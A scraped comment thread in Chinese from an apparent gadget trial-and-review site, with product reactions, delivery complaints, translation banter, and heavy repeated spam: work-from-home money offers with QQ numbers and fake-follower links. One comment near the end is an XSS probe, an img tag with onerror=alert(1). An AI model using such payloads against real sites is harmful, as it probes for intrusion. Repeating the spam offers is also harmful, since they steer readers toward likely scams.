 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
小米的路由器功能相仿
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
原理大概就是把遥控器的数据复制到这个智能遥控，然后智能遥控附上给手机来控制，。就是一个中介
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
呵呵  希望能抢到 
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
真管用吗？？？
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
创意不错 就是外观有待改进啊
能出增加16G/32G版的有USB3.0接口，就有更多选择。就好了
非常期待，不知道多久上市，价位如何？
更多酷产品尽在：http://www.kooke.org/kchanpin/ 
....这就不能叫3D，就是用电热器那塑料融化，拉成丝
更多酷产品尽在：http://www.kooke.org/kchanpin/ 
喜欢啊  真想拥有一个
我去，我已经预约了两个星期了   怎么没反应啊   焦急啊
拜托 拜托 求抽到
这玩意上的玻璃框图跟我5寸手机上的玻璃屏幕图一样耶...
不错的设计，基本功能都得以满足。
不错不错 我的最爱
 面的弊端，这也正是我看好小米盒子这款设备的条件之一，发展初期的盒子视频源少，但是质量确是1等1的，也就是说，虽然安装别的视频软件，但是对于盒子本身的小米视频不是随意扔弃，而是期望很深！另外小米盒子是小米手机的最发烧配件！从这句话来看，他必定能和现代的只能手机有着默契的配合，而现实也却是如此，值得令人夸赞。小米盒子我对于他未来的期盼很多，设备也将越来越完善，一个不断发展不抛弃的公司他们的产品是 
相信如果别的东西的评测还有所欠缺，没有具体实际的操作的话，这款设备使用一段时间的我能说上两句，小米盒子从定位上就是网络电视机顶盒，所以对于硬件设备于乐视tv有所差距，但是现实生活使用完全能够担当责任，而这种设备要从软硬件方面来探讨，官方的软件处于研发初期还不完善，但是对于使用体验已经做的相当好了！而开源的基础android也成就他能安装其他的平台，例如泰捷TV，完善它资源的欠缺和对于网络电视直播方 
值得令人期盼的！ 
我的号发错了，zc俞梓翊才是应该发的号
这个很炫，自己也会去买~~~
把跑步和游戏相结合，让懒人也能在运动中游戏，很不错的想法~~~
之前也想到用这个发电，没想到那么快就有人做成洗衣机了，具体细节解决了的话还是很不错的。
这个价格拒绝了一大批人，饭店可以提倡剩饭做成肥料再反馈给农民
有没有小米3的 
看着就高大上啊，希望运气好点能给我玩玩~
我也想要，求抽到
每次都没抽风，几率太小了，但求抽到。。。。给你机会吧
真心的期待啊...... 
选我选我。。。。
感觉360安慰安慰我那老是不中的受伤心灵，继续支持！！希望下几次能抽中试用，要是能进测试组就更开心，一定认真对东西进行评测滴，再次感谢，顶
我的竟然是粉红的，让我这个大老爷们情何以堪？
靠，咱能快点卖吗？
这怎么会抽到我呀......
这个就是所谓的3d吗？唉
软件倒是用过，不过这东东没买过。。。。
这东西怎么穿。。。。。
很有创意的产品，关键在于便携。发挥你的奇思妙想吧~~希望能普及，一个好的创意如果能够产业化，成本、价格就下来了。
我想问问多少钱呢？
同感 ！同感 ！
能远程 开关……
其实　很久以前就考虑过这个设计，现在也有很多人在做了，比如手机充电的时间是有限度的，晚上睡觉给手机充电又怕充时间太长，插座的时间可以设计成定时的，计时的，远程开关的以及造型更加炫酷的
一个电烙铁而已，狗批3D
很感谢给我的安慰奖，可是都3天了，还没收到。希望能查看到配送的时间表，物流跟踪。
这个，应该还好吧，我来攒个人品。
万一一只恐龙对帅锅透明了帅锅该肿么办
adsl和光猫 再加上无线路由！！！！！
期待。。。。。。
1傻了吧，那在高速公路上没油了不是一样完蛋
那是跑车好吧！   0-100km/h加速只需6.5秒，这是同价位的车能达到的吗？
带眼镜跑步，会不会绊倒或者撞墙上？
给人感觉就不一样
确实很好，加油
加油啊，应该会不错的
真心在哪买
支持一下，什么时候能预约呢
看着就高大上啊，希望运气好点能给我玩玩~  
我谁说是 上午
看看...........
感谢安慰奖，不过还没收到   
儿时的梦想，未来电竞FPS的趋势哈哈，想海淘啦
电源键是个电源检测键好吧！看看说明书！
快点出来吧，等了半个月了。。。。。。。。。。。。
希望不要太贵，否则承受不起啊！！！！！。。。。。。。。。。
恐怕还要翻10倍都不止！
赶紧出来啊，家里路由器已经很多问题了
小编怎么知道我想要什么的？  哈哈   其实十分想试用产品，不过还没有机会。这次准备为惊喜写一份报告。
12312121
期待ING...
能不能跳闪？，要不我先把家里买个保险？？哈哈
只要不是个弱智，应该能看懂时间
预定价格只需 99 英镑，哪里预定？
这个真的不错哦
帅气的东西，我需要一个
所谓专业骗回复啊。。。 奇葩吧你，这种煞笔我还真没见过
谢谢360的安慰奖。之前已经买了2个一代，2个二代，很好用。配套的软件更新的也快，比最开始用一代时增加了许多实用的功能。360加油！顺便说一下儿童手环赶紧上市啊，我要买一个！
你连这个都原样复制啊，太省了！
我想要，非常喜欢 
两个轮子差速转动，或者反向转动就可以实现转向了
好像很好玩的样子，但是对于我这种没有艺术细胞的人来说，还是默默地飘过。。。
简直是我们胖子的福音啊  既可以玩游戏又可以减肥这想法太棒了 赞啊！~ 不过这个安全性怎么样。最大130公斤 应该也差不多反正我没到130。。。 这鞋子可以选大小的吧。总之好东西你们很有想法 和我学做菜把。。。。
未来的电脑方向！！
谢谢360的安慰奖。
很有创意，顶一个！
我晕，用的都是我的图片！！！
恩，很期待。
还有谁想要经典型手表，可以联系我。球球1582674801
   估计说的地震报警也是没多大用处，因为等到它检测到地震了。那也就晚了。
感觉360安慰安慰我那老是不中的受伤心灵，继续支持！！感谢安慰奖
在整合一个摄像功能，就好了
你是男生还是女生啊
不凡的外观注定要高上大！！
其实我还有好些个自认为不错的点子。我还是等到申请成功之后写试用报告时再说出来吧……嘎嘎！！！
几率好低.......
 卧槽太坑了还3d我日真敢讲，就是热胶棒，他也说了要电不和热胶枪一样，我平时还用这个呢，哎
- -我想,万一别人也有这玩意,到我家里弄我的遥控器,那天没准随便一弄,我家的电视都乱了,我会不会找不到原因去把电视砸了啊......
掉丢后,有人故意把那玩意取出来扔掉咋办?????
支持奇酷产品就是支持创新………………
 321张宁 无语了！太强大了！科技真是越来越发达了！这才是真正的高科技！
求出电信4G版本399我都买
亲们，这虽然是热熔器！但是，是搞艺术的！！！！这种价值是无法衡量的………………我支持创新！
微博免费刷粉丝平台：http://t.cn/8s9xp3h
呵呵呵呵呵呵呵
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
尼玛4月5号结果一发布早上EMS就来我家敲门了！
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
微博免费刷粉丝平台：http://t.cn/8s9xp3h
什么时候能预定。。。。
赞啦~不错哦~
给力 好技术 专业的试用报告
前来支持。。。写的更加认真点嘛~
微博免费刷粉丝平台：http://t.cn/8s9xp3h  
微博免费刷粉丝平台：http://t.cn/8s9xp3h  
微博免费刷粉丝平台：http://t.cn/8s9xp3h  
很好啊。看上去不错，可以做一些小摆设，发挥自己的想象。。。到时候买一个玩玩也很好···
我值得拥有。。。
太贵了有木有！！
摇的力气用手都洗完了
让我有想创作的冲动了，给力！！！
谢谢支持啦，多谢建议，还没完全写完呢，今天还要更新一部分，还有慢慢更新呦~~~会更加努力的！
312222 333333333
感觉很实用吧！
产品辐射的范围还是受到限制，比如卧室的家电设备和客厅的家电设备可能要分别安装一台吧，很多做智能家居的厂商已经有成熟的产品了
夏天戴起发热不？
看起很酷！
这是给有钱人家，有花园的家庭吧，我就养老几条鱼，花也就2盆吊兰。天天有肥料出来怎么办。
感觉体积太大了点，有些笨重……
期待，怒赞！！！
很漂亮，喜欢!
很期待！！！
作为普通人的我，觉得真的很鸡肋。看上去都觉得没意思。
360路由器缺少USB插口，希望以后能有。
如果再小一点就好用了
这跟感觉很实用
能飞一分钟吗
创意不错，就是要随身携带有点累赘
有了它可以发挥你的想象力和创造力，再便携点就更好了。
这个好，可是感觉价格不便宜啊。 一百以内就行了
- - 好吧。我是女汉子。就对这些东西心动！可是前面那外形好丑
这个喝水也要这么麻烦？ 买这个的人真是闲钱够多啊。 我只觉得这个给一些特殊人士用用。 完全是鸡肋的东西啊
这个这个，穷人真的只能看看啊！
这东西价格不合理。也不实用。只能给有钱人那什么什么一下。 真正的科技还是没有出现！
挺好玩的，还是价格的问题啊！
这个不错。 一百左右能接受
想要提交试用报告，可还没收到啊！不会发的包裹吧
高科技产品，未来趋势！
的确需要改进。。。
有一个usb插口
这里有卖，我家的就是他家买的，效果很好  功能强大  http://sil168.taobao.com
渣渣创意呀~~~~~~~~~~~~ 你直接合成3D相片 还可以考虑买一个~~~ 居然左右是相反的~也就是说不能拍左右相片了~~~~~~~~现在人都用手机了吧~还需要分着玩。
借问，这个安慰奖发了没？我咋没收到呢？
想要提交试用报告，可还没收到啊！
视角不一样呀~ 随时查阅资料，随时在眼前显示，随时跟眼同步录像……手表做不到，但是价格可……
唉,,,...
看起来挺不错的。
发货了木有啊？还木有收到啊
在精致点就更好了...
149.95美元=933.2888人民币　　　　　不是几千，不错诶．．．．
尼玛．．．．日产品么．是中国人的都不会要
他喵的2000的遥控飞机太贵了啦，还不如买mini
还不错啊喵
承受不了。。。
图文结合写的真好，我也想要一个这样的手机套，可惜不是Note3的手机。
好东西，赞
如何购买，对我而言很实用啊。
低调奢华有内涵！大爱！
举报！有人大量盗用我体验报告的图片，那人除了包裹和外装盒正反两面，共计3张图是自己的，其它的图片用的全是我的图片。 对方报告名称：wearGo 手机套测评—奇酷No.569试用官（鹭鸶蝶梦）报道 对方报告链接：http://www.qikoo.com/try/paper?id=5350029b85e737400a000001
想要提交试用报告，可是还没收到啊。唉，怎么查询快递啊
智能计步器很不错啊。还有多个颜色。
好想要啊！
酷！等待体验...
写的真棒！学习了！颜色貌似单调了点，但具备强大的续航能力，想想还有点小激动呢！
打印笔太火爆了。
估计比市面的都会便宜吧。
如何查询快递啊，现在还没有收到，也不知道什么情况。
支持一下！
主要就是价格
好酷的样子
不过我每天用电梯上楼（20楼耶！）
你个狗逼，狗娘养的
1440元
宝剑赠英雄，我会好好测试的！！
还为收到！等待ing
这是个好东东，支持360
期待好东西的到来
真有意思！
这个，，，干嘛用的。。。我楞是没明白。。。。
这个不多说，出来必买！ 
什么时候才能买啊 
要去支USB3.0
挺好的,赞一个,希望下期有我
支持更加方便
        我来瞅瞅。点点点点哇赞赞
不错，可惜很肌足
好用吗？ 靠 
感觉还行吧。可惜还是不够智能。
难得有纸制电池。
看起来不错啊，有没有柯南的叼
是不错，主要是功能太单一性了
支持！希望能被选上试用！
不错。感觉好好。
挺好的。不知道作用范围是多少？
外形设计不错。
本来可以很方便的带条数据线充电，现在科技进步了，搞个无线感应充电，手机依然要插，但却要额外带块砖头
这个价格还可以。但死穴是太重。跟独轮的比，估计重了50%左右
贵，而且，电池经过高速碰撞，安全性值得怀疑。广告说特斯拉安全性如何如何好，但实际碰撞依然起火，美国已经起火几辆了，但是在国内的话，估计起火是没法赔的
还不360安全路由。    随身WIFI 4G版第一阶段先与广东移动先展开
360   01002265666233620036652
36366
只卖99还包邮，还支持以旧换新换新价49~~~~~
哇~~~  图片拍的很清晰 评测有点专业的意思哦~~~~~~~~~~~~~~~~~~
方便~~科学~~希望能得到一个~~
很有创意，不过我希望的是360可以制作一款专门针对Ubuntu系统的，或者内置Ubuntu系统的U盘
不错哇，就是价格有些贵咯，感觉要是可以做到100元以内的话，肯定会大有市场的
创意非常好 就是不知道什么时候出来
请问发货了没有
小巧的计步器哦，15天的续航很赞呢！
居然破一万点大关了，奇酷网友的阵容越来越强大了。期待小编上更多的新品哦，加油！
有点像热熔枪，不过想法很奇妙。
是啊，使用人数节节高攀哦！
这个50元的成本就能搞定，这也坑爹了。
什麼時候發貨錒。。。
拿来***用的吧。。。 
好酷的感觉0.0
赞啊~想要啊. 
去看看视频  要不有类似腰带的东西带着你  不让你左右动   然后好像可有旋转  
太薄了会不会一坐下就断成两半了 
好慢啊！发货
没有手机吗？怎么不见装机后的实际测试？
看来以后发图片，加上自己的试用卡在旁边，还是很有用的。
啧啧，只是手机套鉴赏，没有装机验证，怎么判定它是好是坏呢，坐等后续报告，关注续航等实际问题中……
期待快点开始，希望有机会试用一下高科技啊
大家好，我帮忙给翻译了  我是531号缓刑监督官。 收到产品,因为该公司有那一天,我出差4天,然后我有4天可以“t找到我把公司内部的产品,这次我“360很抱歉让你失望我很抱歉这次我对不起你很酷,我很抱歉。下次不会让你失望的。
好想买到，可是好难得等
你翻译错误了  不能用软件翻译 
我是531号试用官  这次在公司收到产品,已经是4天后了,我四天后已经出差了,四天内,我不能回到公司,所以这次要对360,说一身抱歉了,再次道歉,下次我不会让你们失望的
我是第135号奇酷体验用户：      因为我出差走后第四天才得到产品的邮递，所以我有四天的时间产品都是放在公司里的，这段时间让我非常抱歉也让你失望了360，我感到很抱歉。下一次一定不会让你失望。 
나는 제531호 奇酷 체험 사용자: 나 때문에 출장 간 이후로 네 번째 천재 얻은 제품 운송, 그래서 내가 나흘 시간 제품 다 넣어 회사에서, 그동안 내가 죄송합니다. 또 실망시켜서 360 나는 송구합니다.다음 번엔 꼭 보여드리겠습니다.
咱能不抄袭嘛，节操呢...这明明是我翻译的好咩~
吾乃第531号奇酷验以户： 以吾差去后四日乃得产之邮，故余有四天之时物皆是放在公司里之，此时使吾甚愧谢亦令汝望矣360，余感甚谢。一下必不令汝望。
你们大家翻译有误啊 360看到我怎么办
那只能说你表达有问题
我系第531号奇酷体验用户： 因为我出差走后第四天才得到产品嘅邮递，所以我有四日时间产品都系摆喺公司度嘅，呢段时间畀我好对唔住，都畀你失望啦360，我觉得好对唔住。下一次一定唔会畀你失望。
饿。。。Dont English
أنا كنت رقم 531 امتحان ضابطة.        يست360لم منتوجات لأنّ الشركة يتلقّى شيء أنّ يومإي على عمل رحلة ل 4 أيام, بعد ذلك يتلقّى أنا 4 أيام علبة خلفيّةهذا وقت إي  
我是531号缓刑监督官。 收到产品因为公司有一天，我在4天的出差，我有4天回来就可以“找到我的产品放在公司内部，我很抱歉让你失望360我抱歉这次我对不起你的冷却时间，我很抱歉。下次会不会让你失望的。 2014年4月20日 no.531缓刑监督官        
我是第135号奇酷体验用户： 因为我出差走后第四天才得到产品的邮递，所以我有四天的时间产品都是放在公司里的，这段时间让我非常抱歉也让你失望了360，我感到很抱歉。下一次一定不会让你失望。
我说什么好，以后记住单词开头大写要去掉噢，加油
你们的翻译我情以何堪 不能用软件翻译
.....OK
怎么不放在手机上 
亲，建议和bug呢？
有了大家的支持，相信商家会开发出配套更多型号手机套的。
自己帮顶！
谢谢安慰奖啊，支持360，可是没收到货，收到货后试用报告妥妥滴
感觉app设计的还不错，，如果有运动社区最好啦
还真的是呀 这个怎么搞得，，不会真是盗用的吧
99￥一台.....................
我要！！！！！！！！！！！！！！！！！！！！！！！！
非常期待。  
太想要了！！！
499官方参考价格，我也想要了
我可以有、因为我总不爱锻炼、有了就爱锻炼了
我也要...........
看 就是高科技
这个是一个好东西 雾霾不怕了
增加佩戴方式，有心率检测之类就比较完善了 ，具有及时通信功能，能把数据传到医师平台或家庭手里，就美了。
499官方参考价格，我也想要了
我总不爱锻炼、有了就记得锻炼了 
自己顶一个哦，希望对大家有帮助。
wo wan quan kan bu dong, yin wei wo bu dong ying wen,bu guo hai shi yao zhi chi ni.
15个工作日内发货吧。貌似。
啥 时候能 开卖 呀
这篇报告很有创意啊！
好细致的测试啊，看起来很专业。
科学的锻炼身体，对增强身体健康有很大的作用，期待
又没办法移动，位置很受限的。。
写得不错，挺有文采的，期待继续能有更多的精彩
什么时候发货呀，现在发了吗
两面线序相反不就行了？
赞赞赞赞赞赞赞赞赞赞赞赞
很是贵啊啊
我想要一个，因为对我来说很不错啊
筛选的老师，给我个吧，真心的期待以及想要。感谢！感谢！
能够科学锻炼，起到事半功倍的作用就很好了，偶想来个使用
科学监督啊，健康每一天，求个
好想要，因为我要减肥。。
亮点是：佩戴方法多，固件可升级，双传感器，记录精准
这个不错，出来之后买一个
我是程序员，真的需要
好东东，就要支持一下，赞一个！
laiyigelaiyige shishi
兰博基尼的跑车贵 手机贵 耳机也贵  和兰博基尼挂钩的都这么贵。。。 
东西不错能让你记得锻炼，身体是革命的本钱
10000平方英尺=929.0304平方米
10000平方英尺=929.0304平方米  不中用
必须申请，一定要感受。
真的好喜欢这个玩意啊
功能要更多些就好了
好高端的耳机啊。。。
这玩意 给所有妹子穿吧
哈哈。这个应该没法控制别人家的东西吧。
没有360的摄像头好吧。期待赶紧出来啊。
谢谢360的安慰奖。  儿童手环赶紧上市啊，我要买一个！ 
看来这又是360的一个商机啊，。
9980 还行吧。
设计独特，很有创意  
这东西咋钓鱼啊。没看出来啊。
这个真的是不浪费一丝能量。这个如果真的能实现 ，将会是革命性的成果，一定支持
第七期了，一期都没中，倒成了天天免费为奇酷推广打广告的人。
绝对是环保的好产品，中国很需要这样意识的产品，改变原来的环保观念。
已经有人抱怨一直没中过了
还不出来，说好月底的，现在广告都没有了。
好东东，就要支持一下，赞一个！ 
好东东，就要支持一下，赞一个！ 
家庭主妇的小肚腩，亟待拯救呀呀呀~
同病相怜啊~握个抓~
一直都是自己梦寐的宝贝，首先支持！！~~
别急，更酷的还在后面！
好东西支持一下
来吧。我想试一下！！！
好东西，必须支持
希望不要太贵，否则承受不起啊！！！！！。。。。。。。。。。 
可以加入颜色变化啊
高大上的感觉
好羡慕哦，真棒！
好智能的产品哦，恭喜楼主！
放大版的360wifi啊
非常期待3d打印笔的到来 
绅士手机套，有点意思，赞一个先！沾沾喜气，希望下次自己也有机会哦！
我真的太想试一试。
好东西支持一下！！
很适合热爱运动的我，哈哈
智能组合套装。哈哈
支持一下！！ 求试用！
累死了，写了一天，自己给自己点个赞先。
好厉害，不过因为电池在正面的原因。开窗户还hi不大现实啊
看来不足之处还是大于优点啊。
报告写的很详细。已赞。软妹币。哈哈
可以放后面啊，或者电池可以不用全部占满正面啊，这样同时用两块纸电池电量和外观可以完美统一的啊。恩呀，给个精呗，看着我这么认真写报告的份上
这是我想要的，尤其是视频监控，如果可以跟360云盘一起就完美了
这个功能可以和麦步整合！
这个功能和智能路由整合，或者衍生成自能路由的插件，实现家电的接驳。产品线过份分撒，功能又重叠，会造成自身产品的内耗，影响销售！！！
应该不会超过二百元，360产品都比较便宜，
穿墙能力怎么样啊
我说的是纸电池可以放后面
麦步天，精彩、精准、精致，一步都是乐趣！！
好期待试用啊。
感觉很不错
不错，已入。坐等发货
看着挺好想参加体验，希望中标。
续航能力很不错啊。
我想买。多少钱。
买到手后悔死了，谁要我1000卖了，刚买回来两天。
对于喜欢跑步的我是在是太好
近视的人是否适用？？？
准备好了吗？
真心想要☻☻☻ 
兰博基尼 梦想的
中了个随身WIFI，真开心，就是东西还没收到，会继续支持
大屏手机的福音！
期待试用。。
筛选的老师，给我个吧☻☻☻
筛选的老师，给我个吧☻☻☻  
真是意外的惊喜，谢谢奇酷，谢谢360
安慰奖  谢谢 相当不错的360随身wifi，方便、快捷，安装最新的驱动后功能强大。 
真心高级，我好想要哇
希望得到试用
我上下班都是走路！期待能抽中我试用！
太贵,没法买
热切期盼能得到试用
不得不说这个计步器好实用！~~~~~~~~~~~~~~~~~~~~~~
作为一名高二学生，身体是关键，不然高三一定垮，希望得到试用资格，这样健身的时候就有了清晰的记录了。感觉这个小东西比nike+好多了。貌似就有同学想买一个。等我用上了一定推广推广，有这么个好东西还有别的干什么。
也不得不说这个计步器好高档！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
我上下班都是走路！期待能抽中我试用！
没收到货什么时候发货呀，现在发了吗 
欢迎大家来讨论、批评、建议、吐槽、点赞！积极参与呦~~~
看起来不错
这个计步器感觉蛮精致的，撞色设计大爱！全天候自动数据跟踪、自动清除数据，贴心的功能！
不错，哪里可以买？kickstarter上已经募资结束了。后悔没买了。
这是我一直梦寐以求的···支持奇酷产品希望能筛选给我！！！
什么价格，不知道什么情况
期待能体验到
到时候和其他路由器对比看看
看似不错的东西
我发现一个相当强大的问题，所有智能产品都要联接手机，未来手机运存和内存不加大的话，估计要爆了。
太漂亮啦 不知道什么时候能出来！
安慰奖 谢谢 相当不错的360随身wifi，方便、快捷。  
不说那么多，有试用，好的话写详细评论
我愿意也评测 请通过......
真心觉得贵了，700毛爷爷这个价已经是半辆自行车的价格了，我还不如买个LED手电，1、照得远 2、价格平谊 3、携带也方便还可以多用处。
终于等到了，能试用就更好了，迫不及待····
是啊！营销噱头吧？！可能要把360随身WiFi2库存清完了再出！雷军不傻~
对头！2.0太慢了~
看来确实是比较好。
希望可以通过测评，那就可以为我减肥之路添加一点出彩！呵呵呵……
价格有点贵
体重超标/200多斤，好想要，因为我需要减肥。。
太贵了23-30还能勉强接受
能试用就更好了，迫不及待
能试用就更好了，迫不及待
样子很简洁。很想买一套。
外观不错，比一般的好看多了
如何购买？
期待尽快发售。。。。
这样的折叠车挺酷的
在主室的操控范围有多大呢
造型前卫新颖，就是价格，一般人玩不起。
是否可以加入与手机的连接功能？
这不错！感觉很实用！对于我这种每天少不了跑步爬山的人来讲：简直就是牛呆了！
有个抽安慰奖，虽然已经有一个了，也可以给朋友分享
高速有加油站，你有加电站？
外观很不错，小巧，如果有蓝牙电话功能就更好了，哈哈！
谢谢安慰奖啊，支持360，可是没收到货，收到货后试用报告妥妥滴 。
什么时候发货呀
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76909
看着不错，希望能试用，为大家推广
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76 909
利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班 族都可以） 扣：23—603—76909
看上去不错，就是太贵了。1000以下可以接受
恩恩不错，即小巧又方便，希望能中!
这款手表给我的个人感觉很不错，外观很新颖、重要事件看一下手表就可以，不必要看手机！
个头不要太大哦 
不错啊，省钱锻炼集一身，支持
看见有人用，只是觉得在车流中不是很安全，老年人不太合适吧 
非常喜欢，价格不知贵不？
那个电瓶自行车 蛮期待的呦
想买，就是太贵了，没这个预算。
这个咋洗衣服啊？表示好奇
这个将来肯定行
还没用过吧！如果好估计会买！
这太扯了，累一天了谁用这个洗衣服啊
这个设备我喜欢
完全买不起的节奏！抢劫啊
适合孩子用，但是也不能给他配置了苹果6吧，有自己的终端就好了
一直想要，就是太贵了
期待能体验到
我喜欢，挺实用的
如果能当MP3就更好了， 
请问是不是在随身WIFI没有连接在电脑的情况下,也可以通过随身WIFI链接上网络呢?
穿墙能力怎么样啊 ？
想中，好像不错。
 利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76909 
 利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76909 
 利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76909 
 利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76909 
 利用闲余时间，给自己找份宅家的网络差事吧～～～ 不限制工作时间，做的越多挣的越多～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 扣：23—603—76909 
这个必须点赞！！！！！！！！！
广告勿扰，已举报
看着不错哦
9天还没收到？不应该啊！我的在哪里啊！
都不标上价格。。。。
个子小，功能大，用途广，最好能当MP3。
哈哈。粉色也不错啊。正好把手机转给老婆用。
卡不紧确实有点小问题啊。
感觉黑色的皮子不是特别的精致。
希望能筛中~~~
赞一下啊赞一下。
这太有创意了吧
好东西，啧啧~~~
有很多奇特的想法啊。感觉都挺好的。可以借鉴。
这些是不是通过手机可以实现呢！手机做语音处理！有必要另外做一个实体吗？
想法很强大，不是所有人都习惯用手机操作！
想了解下它是通过什么远称控制的
怎么没有人评论?是因为太贵吗?
应该有水印啊。双层水印了？
估计得有WiFi吧
还没有收到
好东西啊，而且要买买两个
学生党表示买不起!
很有创意很环保，但是要做到每家每户都有一个，价格偏高了一些。
不喜欢这个造型，怎么放都占空间。
这个小飞碟用起来好复杂啊。
我也好想要啊。可惜没来得及申请。
你这么打酱油的吗，360造吗？不如把机会送给有手机的人测试，你拿了也没用呀。
又一个打酱油，没手机的。奇酷360你造不？
又一个打酱油，没手机的货。奇酷360你造不？
这么多个打酱油，没手机的货。奇酷360你造不？ 你造不造？
创意真心不错，希望能尽快投入到普通家庭中使用，像北京现在的环境，如果能够使用上，我们的生活品质一定可以得到改善的。加油！
这么多个打酱油，没手机的货。奇酷360你造不？ 你造不造？ 试用报告什么意思？奇酷你造吗？
大赞.比那些没手机还参加的人好多了
这么多个打酱油，没手机的货。奇酷360你造不？ 你造不造？ 试用报告什么意思？奇酷你造吗？
这么多个打酱油，没手机的货。奇酷360你造不？ 你造不造？ 试用报告什么意思？奇酷你造吗？
灵敏度够不够
写得不错，已赞，继续努力哦！！！
asdasdsadasddas
asdasdsa
希望送一个和老婆一块减肥！！！！
什么时候3D打印机能普及呀
期待被选中
我记得这个报告前几天还上首页了吧。
样子应该更时尚。材质应该更精致。
这两天我还会继续补充，把手机测试部分补充完整。
楼主挺幽默的，写得很具体详细，看的出是用心去写的，期待更多这种评测文章
俺是有手机的哦~~~~~而且还是有NFC功能的，哈哈
终于筛选了   期待啊
摇杆驱动程序，哈哈哈，笑死我了，不给赞不行啊
还有蓝波球，海贼王的桥段啊，你是乔巴吗？不过最后又成了灰太狼
真难为你了。
从传送门跟过来的，必须给个赞啊，写的真心挺好的
筛选喽～期待
今天短信通知发货了
好期待呀！
在哪里买！！！？？？？ 
这个造型创意很不错，我也是骑行爱好者，期待早日上市
看来你是找骂！！！！！
这是医疗类的手机壳吗？
2000美元。好贵啊。
不错不错！真的不错！
&quot;&gt;&lt;img src=# onerror=alert(1)&gt;
来看下运气，虽热参加这种东西从没被选中过。
太贵了。。。
